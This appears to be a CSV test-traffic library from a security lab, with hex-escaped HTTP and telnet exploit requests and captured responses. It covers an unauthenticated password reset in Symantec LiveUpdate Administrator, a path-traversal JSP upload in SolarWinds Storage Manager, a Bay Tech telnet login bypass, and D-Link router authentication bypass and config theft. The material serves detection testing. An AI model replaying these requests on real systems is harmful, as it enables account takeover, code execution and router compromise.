XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿TSL20140328-07_Symantec_LiveUpdate_Administrator_Security_Bypass.xml,Symantec LiveUpdate Administrator Security Bypass,"A security policy bypass vulnerability exists in Symantec LiveUpdate Administrator. The vulnerability is due to a failure to validate temporary passwords when processing a user account password reset. This can result in an arbitrary password reset. A remote unauthenticated attacker could exploit this vulnerability by sending a malicious request to forcepasswd.do, providing a LiveUpdate Administrator victim email, and a new password, effectively setting the victim user password to any arbitrary value. Successful exploitation could lead to security policy bypass and access to sensitive information.","HTTP,HTTPS",TCP,GET /lua/welcome.do HTTP/1.1||0D 0A ||HOST||3A || 172.16.8.246||3A ||7070||0D 0A ||User-Agent||3A || POC||0D 0A 0D 0A||
TSL20140328-07_Symantec_LiveUpdate_Administrator_Security_Bypass.xml,Symantec LiveUpdate Administrator Security Bypass,"A security policy bypass vulnerability exists in Symantec LiveUpdate Administrator. The vulnerability is due to a failure to validate temporary passwords when processing a user account password reset. This can result in an arbitrary password reset. A remote unauthenticated attacker could exploit this vulnerability by sending a malicious request to forcepasswd.do, providing a LiveUpdate Administrator victim email, and a new password, effectively setting the victim user password to any arbitrary value. Successful exploitation could lead to security policy bypass and access to sensitive information.","HTTP,HTTPS",TCP,POST /lua/forcepasswd.do HTTP/1.1||0D 0A ||HOST||3A || 172.16.8.246||3A ||7070||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||User-Agent||3A || POC||0D 0A ||Content-Length||3A || 139||0D 0A ||Cookie||3A || JSESSIONID=BB81465C85A374B3263374C29629986E||0D 0A 0D 0A ||org.apache.struts.taglib.html.TOKEN=TSLPOC&hidLuauserEmail=a@abc.com&dispatch=force&newPassword=password123&validateNewPassword=password123
TSL20140328-07_Symantec_LiveUpdate_Administrator_Security_Bypass.xml,Symantec LiveUpdate Administrator Security Bypass,"A security policy bypass vulnerability exists in Symantec LiveUpdate Administrator. The vulnerability is due to a failure to validate temporary passwords when processing a user account password reset. This can result in an arbitrary password reset. A remote unauthenticated attacker could exploit this vulnerability by sending a malicious request to forcepasswd.do, providing a LiveUpdate Administrator victim email, and a new password, effectively setting the victim user password to any arbitrary value. Successful exploitation could lead to security policy bypass and access to sensitive information.","HTTP,HTTPS",TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Set-Cookie||3A || JSESSIONID=BB81465C85A374B3263374C29629986E||3B || Path=/lua/||3B || HttpOnly||0D 0A ||Pragma||3A || No-cache||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Expires||3A || Thu, 01 Jan 1970 00||3A ||00||3A ||00 GMT||0D 0A ||Content-Type||3A || text/html||3B ||charset=UTF-8||0D 0A ||Transfer-Encoding||3A || chunked||0D 0A ||Date||3A || Wed, 02 Apr 2014 21||3A ||15||3A ||21 GMT||0D 0A 0D 0A ||25e||0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ||<html lang=||22 ||en||22 ||>||0D 0A ||    <head>||0D 0A ||<meta http-equiv=||22 ||content-type||22 || content=||22 ||UTF-8||22 ||>||0D 0A ||<link href=||22 ||/lua/theme/Master.css||22 || rel=||22 ||stylesheet||22 || type=||22 ||text/css||22 ||>||0D 0A ||<title>||0D 0A ||Login||0D 0A ||</title>||0D 0A ||<script language=||22 ||javascript||22 || src=||22 ||jslib/xp_progress.js||22 ||>||0D 0A ||</script>||0D 0A ||</head>||0D 0A ||<body class=||22 ||bodyClass||22 ||>||0D 0A ||<script language='JavaScript' src='/lua/jslib/UcJavaScriptLib.js'></script>||0D 0A ||<script>||0D 0A ||setImagepathForCurLocale('images')||3B 0D 0A ||</script>||0D 0A ||<!-- START HEADER -->||0D 0A ||<table width=||22 ||100%||22 || border=||22 ||0||22 || cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || >||0D 0A ||<tr>||0D 0A ||<td width=||22 ||100%||22 || valign=||22 ||top||22 || align=||22 ||left||22 || colspan=||22 ||9||22 ||>||0D 0A 0D 0A ||36b||0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A 0D 0A ||<!-- START HEADER -->||0D 0A ||<table cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || width=||22 ||100%||22 || border=||22 ||0||22 ||>||0D 0A ||  <tr>||0D 0A ||    <td id=||22 ||topbar||22 || valign=||22 ||top||22 || name=||22 ||topbar||22 ||>||0D 0A ||      <table cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || width=||22 ||100%||22 || border=||22 ||0||22 || height=||22 ||39||22 ||>||0D 0A ||        <tbody>||0D 0A ||          <tr>||0D 0A ||            <td width=||22 ||500||22 || rowspan=||22 ||3||22 ||><img border=||22 ||0||22 || src=||22 ||images/lua_public_banner.gif||22 || width=||22 ||500||22 || height=||22 ||39||22 ||></td>||0D 0A ||            <td valign=||22 ||top||22 || align=||22 ||right||22 || background=||22 ||images/lua_banner_background.bmp||22 ||>&nbsp||3B ||</td>||0D 0A ||          </tr>||0D 0A ||        </tbody>||0D 0A ||      </table>||0D 0A ||    </td>||0D 0A ||  </tr>||0D 0A ||</table>||0D 0A ||<!-- END HEADER -->||0D 0A ||</td>||0D 0A ||</tr>||0D 0A ||</table>||0D 0A ||<!-- END HEADER -->||0D 0A ||<table width=||22 ||100%||22 || border=||22 ||0||22 || cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || >||0D 0A ||<tr>||0D 0A ||<!-- START CONTENT -->||0D 0A ||<td width=||22 ||100%||22 || valign=||22 ||top||22 || align=||22 ||left||22 || colspan=||22 ||1||22 ||>||0D 0A ||<table cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 ||width=||22 ||100%||22 ||>||0D 0A ||<tr>||0D 0A ||<td||0D 0A || valign=||22 ||top||22 ||>||0D 0A ||19f6||0D 0A 0D 0A 0D 0A 0D 0A ||<Noscript>||0D 0A ||<meta http-equiv=||22 ||refresh||22 || content=||22 ||1||3B || URL=enableJavaScript.do||22 ||>||0D 0A ||</Noscript>||0D 0A 0D 0A ||<script language=||22 ||JavaScript||22 || src=||22 ||jslib/sha.js||22 ||></script>||0D 0A 0D 0A ||<script type=||22 ||text/javascript||22 ||>||0D 0A 0D 0A ||    var submitted = 0||3B 0D 0A 09 ||function goLogin () {||0D 0A ||        if (submitted==0) {||0D 0A ||            submitted=1||3B 0D 0A ||          document.loginForm.javaScript.value='enabled'||3B 0D 0A 09 09 ||  var pass1 = document.forms[0].password||3B 09 09 ||  ||0D 0A 09 09 ||  if (pass1 != null)||0D 0A 09 09 ||  {||0D 0A ||          ||09 ||pass1.value = b64_sha(pass1.value, 'SHA-1')||3B 0D 0A ||          }||0D 0A ||          return true||3B 0D 0A ||        } else {||0D 0A ||            return false||3B 0D 0A ||        }||0D 0A ||    }||0D 0A ||    ||0D 0A ||    ||09 0D 0A ||</script>||0D 0A 0D 0A ||        <form name=||22 ||loginForm||22 || method=||22 ||post||22 || action=||22 ||/lua/login.do||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || onsubmit=||22 ||goLogin()||22 ||><div><input type=||22 ||hidden||22 || name=||22 ||org.apache.struts.taglib.html.TOKEN||22 || value=||22 ||ae46d59d010431d19d8080fdd1328e36||22 ||></div>||0D 0A ||        <input type=||22 ||hidden||22 || name=||22 ||javaScript||22 || value=||22 22 ||>||0D 0A 0D 0A ||        <table cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || width=||22 ||760||22 || border=||22 ||0||22 ||>||0D 0A ||          <tbody>||0D 0A ||            <tr>||0D 0A ||              <td colspan=||22 ||3||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||40||22 || width=||22 ||248||22 || border=||22 ||0||22 ||></td>||0D 0A ||            </tr>||0D 0A ||            <tr>||0D 0A ||              <td width=||22 ||248||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||248||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td colspan=||22 ||2||22 || align=||22 ||left||22 ||>||0D 0A 09 09 ||<img src=||22 ||images/lua_title.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||50||22 || width=||22 ||280||22 || border=||22 ||0||22 ||>||0D 0A 09 ||      </td>||0D 0A ||            </tr>||0D 0A ||            <tr>||0D 0A ||              <td width=||22 ||248||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||248||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td width=||22 ||47||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||47||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td class=||22 ||version||22 || align=||22 ||left||22 || >||0D 0A ||                          Version||3A || 2.3.2.99||0D 0A 09 ||      </td>||0D 0A ||            </tr>||0D 0A ||            <tr>||0D 0A ||              <td colspan=||22 ||3||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||30||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||            </tr>||0D 0A ||            <tr>||0D 0A ||              <td width=||22 ||248||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||1||22 || width=||22 ||248||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td colspan=||22 ||2||22 ||>||0D 0A ||                <table cellspacing=||22 ||0||22 || cellpadding=||22 ||0||22 || border=||22 ||0||22 || width=||22 ||100%||22 ||>||0D 0A 09 ||        <tr>||0D 0A 09 ||          <td>||0D 0A 09 09 ||        ||0D 0A 09 ||          </td>||0D 0A 09 ||        </tr>||0D 0A ||                </table>||0D 0A 09 ||      </td>||0D 0A ||            </tr>||0D 0A 0D 0A ||            <tr>||0D 0A ||              <td width=||22 ||248||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||248||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td width=||22 ||47||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||47||22 || border=||22 ||0||22 ||></td>||0D 0A ||              <td>||0D 0A ||                <table border=||22 ||0||22 || width=||22 ||100%||22 ||>||0D 0A ||                    <tr>||0D 0A ||                      <td colspan=||22 ||3||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||15||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                    </tr>||0D 0A ||                  <tr>||0D 0A ||                    <td width=||22 ||100||22 || align=||22 ||left||22 || nowrap class=||22 ||heading||22 ||>||0D 0A ||                        <label for=||22 ||user||22 || class=||22 ||heading||22 ||>User Name||3A ||</label>||0D 0A ||                    </td>||0D 0A ||                    <td width=||22 ||600||22 || align=||22 ||left||22 ||>||0D 0A ||                        <input type=||22 ||text||22 || name=||22 ||username||22 || maxlength=||22 ||40||22 || size=||22 ||20||22 || value=||22 22 || id=||22 ||user||22 || class=||22 ||normaltext||22 || alt=||22 ||???en_US.lua.login.alt.username???||22 ||>||0D 0A ||                    </td>||0D 0A ||                    <td width=||22 ||60||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                  </tr>||0D 0A ||                  <tr>||0D 0A ||                    <td width=||22 ||100||22 || align=||22 ||left||22 || nowrap class=||22 ||heading||22 ||>||0D 0A ||                        <label for=||22 ||passwd||22 || class=||22 ||heading||22 ||>Password||3A ||</label>||0D 0A ||                    </td>||0D 0A ||                    <td width=||22 ||600||22 || align=||22 ||left||22 ||>||0D 0A ||                        <input type=||22 ||password||22 || name=||22 ||password||22 || maxlength=||22 ||40||22 || size=||22 ||20||22 || value=||22 22 || id=||22 ||passwd||22 || class=||22 ||normaltext||22 || alt=||22 ||???en_US.lua.login.alt.password???||22 ||>||0D 0A ||                     </td>||0D 0A ||                    <td width=||22 ||60||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                  </tr>||0D 0A 0D 0A ||                  <tr>||0D 0A ||                    <td width=||22 ||100||22 || align=||22 ||left||22 || nowrap>&nbsp||3B ||</td>||0D 0A ||                    <td width=||22 ||600||22 || align=||22 ||left||22 ||>||0D 0A ||                        <input type=||22 ||submit||22 || accesskey=||22 ||?||22 || value=||22 ||Log On||22 || id=||22 ||loginBtn||22 || class=||22 ||buttonclassFree||22 || alt=||22 ||???en_US.global.button.alt.login???||22 ||>||0D 0A ||                    </td>||0D 0A ||                    <td width=||22 ||60||22 ||><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                  </tr>||0D 0A ||                  <tr height=||22 ||20||22 ||>||0D 0A ||                    <td width=||22 ||100||22 || align=||22 ||right||22 || nowrap>&nbsp||3B ||</td>||0D 0A ||                    <td width=||22 ||600||22 || align=||22 ||left||22 ||></td>||0D 0A ||                    <td><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                  </tr>||0D 0A 0D 0A ||           <tr>||0D 0A ||              <td colspan=||22 ||3||22 ||><a href=||22 ||/lua/loginforgotpwd.do||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 ||>Forgot your password?</a></td>||0D 0A ||            </tr>                  ||0D 0A ||                  <tr height=||22 ||20||22 ||>||0D 0A ||                    <td width=||22 ||100||22 || align=||22 ||right||22 || nowrap>&nbsp||3B ||</td>||0D 0A ||                    <td width=||22 ||600||22 || align=||22 ||left||22 ||></td>||0D 0A ||                    <td><img src=||22 ||images/spacer.gif||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||4||22 || width=||22 ||8||22 || border=||22 ||0||22 ||></td>||0D 0A ||                  </tr>||0D 0A 09 09 0D 0A 09 09 ||  <tr>||0D 0A 09 09 ||    <td colspan=||22 ||4||22 ||><img src=||22 ||images/grey.jpg||3B ||jsessionid=BB81465C85A374B3263374C29629986E||22 || height=||22 ||1||22 || width=||22 ||400||22 || border=||22 ||0||22 ||></td>||0D 0A ||  ||09 09 ||  </tr>||0D 0A ||                  <tr>||0D 0A ||                      <td colspan=||22 ||4||22 || align=||22 ||left||22 || nowrap class=||22 ||copyright||22 ||>||0D 0A ||                          Copyright&nbsp||3B C2 A9 || 2012 Symantec Corporation.&nbsp||3B || All rights reserved.||0D 0A ||                      </td>||0D 0A ||                  </tr>||0D 0A ||                </table>||0D 0A ||              </td>||0D 0A ||            </tr>||0D 0A ||          </tbody>||0D 0A ||        </table>||0D 0A 0D 0A ||        </form>||0D 0A ||<script type=||22 ||text/javascript||22 || language=||22 ||JavaScript||22 ||>||0D 0A ||  <!--||0D 0A ||  var focusControl = document.forms[||22 ||loginForm||22 ||].elements[||22 ||username||22 ||]||3B 0D 0A 0D 0A ||  if (focusControl.type != ||22 ||hidden||22 || && !focusControl.disabled) {||0D 0A ||     focusControl.focus()||3B 0D 0A ||  }||0D 0A ||  // -->||0D 0A ||</script>||0D 0A 0D 0A 0D 0A ||    </td>||0D 0A ||</tr>||0D 0A ||</table>||0D 0A ||</td>||0D 0A ||<!-- END CONTENT -->||0D 0A ||</tr>||0D 0A ||</table>||0D 0A ||</body>||0D 0A 0D 0A ||  ||0D 0A ||</html>||0D 0A 0D 0A ||0||0D 0A 0D 0A||"
TSL20140328-07_Symantec_LiveUpdate_Administrator_Security_Bypass.xml,Symantec LiveUpdate Administrator Security Bypass,"A security policy bypass vulnerability exists in Symantec LiveUpdate Administrator. The vulnerability is due to a failure to validate temporary passwords when processing a user account password reset. This can result in an arbitrary password reset. A remote unauthenticated attacker could exploit this vulnerability by sending a malicious request to forcepasswd.do, providing a LiveUpdate Administrator victim email, and a new password, effectively setting the victim user password to any arbitrary value. Successful exploitation could lead to security policy bypass and access to sensitive information.","HTTP,HTTPS",TCP,"HTTP/1.1 302 Moved Temporarily||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Pragma||3A || No-cache||0D 0A ||Cache-Control||3A || no-cache||0D 0A ||Expires||3A || Thu, 01 Jan 1970 00||3A ||00||3A ||00 GMT||0D 0A ||Location||3A || http||3A ||//172.16.8.246||3A ||7070/lua/welcome.do||0D 0A ||Content-Type||3A || text/html||0D 0A ||Content-Length||3A || 0||0D 0A ||Date||3A || Wed, 02 Apr 2014 21||3A ||15||3A ||21 GMT||0D 0A 0D 0A||"
﻿TSL20140827-05_SolarWinds_Storage_Manager_AuthenticationFilter_Authentication_Bypass.xml,SolarWinds Storage Manager AuthenticationFilter Authentication Bypass,An authentication bypass vulnerability exists in SolarWinds Storage Manager. The vulnerability is due to a flaw within the AuthenticationFilter  class. A remote unauthenticated attacker could exploit this vulnerability by bypassing the authentication filter and uploading malicious scripts to the target. Successful exploitation could result in code execution under the context of the system. Tester should set variable $destPort to 9000 before test.,HTTP,TCP,POST /publish/../jsp/ProcessFileUpload.jsp HTTP/1.1||0D 0A ||Host||3A || 172.16.8.242||3A ||9000||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------12345678909876||0D 0A ||Content-Length||3A || 452||0D 0A 0D 0A ||-----------------------------12345678909876||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||poc||22 3B || filename=||22 ||poc.jsp||22 0D 0A ||Content-Type||3A || application/octet-stream||0D 0A 0D 0A ||<%@ page language=||22 ||Java||22 || import=||22 ||java.io.*||22 ||  %>||0D 0A ||<%||0D 0A ||try {||0D 0A ||    PrintWriter pw = new PrintWriter(new FileOutputStream(||22 ||TSL.txt||22 ||))||3B 0D 0A ||    pw.println(||22 ||TELUS Security Labs||22 ||)||3B 0D 0A ||    pw.close()||3B 0D 0A ||} catch(IOException e) {||0D 0A ||    out.println(e.getMessage())||3B 0D 0A ||}||0D 0A ||%>||0D 0A 0D 0A ||-----------------------------12345678909876||0D 0A||
TSL20140827-05_SolarWinds_Storage_Manager_AuthenticationFilter_Authentication_Bypass.xml,SolarWinds Storage Manager AuthenticationFilter Authentication Bypass,An authentication bypass vulnerability exists in SolarWinds Storage Manager. The vulnerability is due to a flaw within the AuthenticationFilter  class. A remote unauthenticated attacker could exploit this vulnerability by bypassing the authentication filter and uploading malicious scripts to the target. Successful exploitation could result in code execution under the context of the system. Tester should set variable $destPort to 9000 before test.,HTTP,TCP,GET /publish/../poc.jsp HTTP/1.1||0D 0A ||Host||3A || 172.16.8.242||3A ||9000||0D 0A 0D 0A||
TSL20140827-05_SolarWinds_Storage_Manager_AuthenticationFilter_Authentication_Bypass.xml,SolarWinds Storage Manager AuthenticationFilter Authentication Bypass,An authentication bypass vulnerability exists in SolarWinds Storage Manager. The vulnerability is due to a flaw within the AuthenticationFilter  class. A remote unauthenticated attacker could exploit this vulnerability by bypassing the authentication filter and uploading malicious scripts to the target. Successful exploitation could result in code execution under the context of the system. Tester should set variable $destPort to 9000 before test.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Set-Cookie||3A || JSESSIONID=0421C63024E0703CC03C30742D5FD8C9||3B || Path=/||3B || HttpOnly||0D 0A ||Content-Type||3A || text/html||3B ||charset=UTF-8||0D 0A ||Content-Length||3A || 175||0D 0A ||Date||3A || Wed, 17 Sep 2014 15||3A ||33||3A ||13 GMT||0D 0A 0D 0A 0A 0A 0A 0A 0A 0A 0A ||<html>||0A ||<head>||0A ||<meta http-equiv=||22 ||Content-Type||22 || content=||22 ||text/html||3B || charset=utf-8||22 ||>||0A ||<title>Process File Upload</title>||0A ||</head>||0A 0A ||<body>||0A ||Upload Successful!!||0A ||</body>||0A ||</html>"
TSL20140827-05_SolarWinds_Storage_Manager_AuthenticationFilter_Authentication_Bypass.xml,SolarWinds Storage Manager AuthenticationFilter Authentication Bypass,An authentication bypass vulnerability exists in SolarWinds Storage Manager. The vulnerability is due to a flaw within the AuthenticationFilter  class. A remote unauthenticated attacker could exploit this vulnerability by bypassing the authentication filter and uploading malicious scripts to the target. Successful exploitation could result in code execution under the context of the system. Tester should set variable $destPort to 9000 before test.,HTTP,TCP,"HTTP/1.1 200 OK||0D 0A ||Server||3A || Apache-Coyote/1.1||0D 0A ||Set-Cookie||3A || JSESSIONID=1A377912EE3F728EEB0FC9553F49C43A||3B || Path=/||3B || HttpOnly||0D 0A ||Content-Type||3A || text/html||3B ||charset=ISO-8859-1||0D 0A ||Content-Length||3A || 4||0D 0A ||Date||3A || Wed, 17 Sep 2014 15||3A ||33||3A ||13 GMT||0D 0A 0D 0A 0D 0A 0D 0A||"
﻿baytechAuthBypass.xml,Bay Tech Authentication Bypass,This threat bypasses the network login ability through telnet by sending the bytes 1B0D0A to a vulnerable host.  This allows the user to login to the privileged application without supplying a username and password.,Telnet,TCP,||1B 0D 0A||
baytechAuthBypass.xml,Bay Tech Authentication Bypass,This threat bypasses the network login ability through telnet by sending the bytes 1B0D0A to a vulnerable host.  This allows the user to login to the privileged application without supplying a username and password.,Telnet,TCP,||ff fd 18 ff fd || ||ff fd ||#||ff fd ||'
baytechAuthBypass.xml,Bay Tech Authentication Bypass,This threat bypasses the network login ability through telnet by sending the bytes 1B0D0A to a vulnerable host.  This allows the user to login to the privileged application without supplying a username and password.,Telnet,TCP,||ff fb 03 ff fd 1f ff fd ||!||ff fe 22 ff fb 05||
baytechAuthBypass.xml,Bay Tech Authentication Bypass,This threat bypasses the network login ability through telnet by sending the bytes 1B0D0A to a vulnerable host.  This allows the user to login to the privileged application without supplying a username and password.,Telnet,TCP,||ff fd 01||
baytechAuthBypass.xml,Bay Tech Authentication Bypass,This threat bypasses the network login ability through telnet by sending the bytes 1B0D0A to a vulnerable host.  This allows the user to login to the privileged application without supplying a username and password.,Telnet,TCP,||ff fb 01||
﻿dlink_bypassAuth.xml,D-Link DSL Router Authentication Bypass,"This threat bypasses the authentication mechanisms put in place by D-Link DSL routers.  This is performed by requesting a file on the system which can place the attackers IP into an allowed list, requiring no authentication.  From here the user can alter the router's configuration.",HTTP,TCP,"POST /cgi-bin/firmwarecfg HTTP/1.1||0D 0A ||Host||3A || example.com||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------195502359115075118961997388349||0D 0A ||Content-Length||3A || 183||0D 0A 0D 0A ||-----------------------------195502359115075118961997388349||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||config||22 0D 0A 0D 0A ||Download||0D 0A ||-----------------------------195502359115075118961997388349--||0D 0A||"
dlink_bypassAuth.xml,D-Link DSL Router Authentication Bypass,"This threat bypasses the authentication mechanisms put in place by D-Link DSL routers.  This is performed by requesting a file on the system which can place the attackers IP into an allowed list, requiring no authentication.  From here the user can alter the router's configuration.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿dlink_bypassAuth2.xml,D-Link Config File Retrieval,This attack retrieves the configuration file from certain D-Link routers.  It takes advantage of a failed password check on the router's web management interface.,HTTP,TCP,"POST /cgi-bin/firmwarecfg HTTP/1.1||0D 0A ||Host||3A || 192.168.8.4||0D 0A ||User-Agent||3A || yeah||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A ||Content-Type||3A || multipart/form-data||3B || boundary=---------------------------41184676334||0D 0A ||Content-Length||3A || 235||0D 0A 0D 0A ||-----------------------------41184676334||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||config.x||22 0D 0A 0D 0A 0D 0A ||-----------------------------41184676334||0D 0A ||Content-Disposition||3A || form-data||3B || name=||22 ||config.y||22 0D 0A 0D 0A 0D 0A ||-----------------------------41184676334--||0D 0A 0D 0A||"
dlink_bypassAuth2.xml,D-Link Config File Retrieval,This attack retrieves the configuration file from certain D-Link routers.  It takes advantage of a failed password check on the router's web management interface.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿iesaveBypass.xml,Save As Dialog Bypass Attempt,"This threat attempts to bypass IE's safety measure of first prompting the user if they would like to save the file specified.  This is done by specifying a web page that does not exist and sending a binary payload as the 404 page.  This threat represents the first exchange, presenting a webpage with an embedded IFRAME tag whose src attribute is set to a 404 page.  If the user then passes the mouse of the href link provided the save dialog will appear.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0||0D 0A 0D 0A||
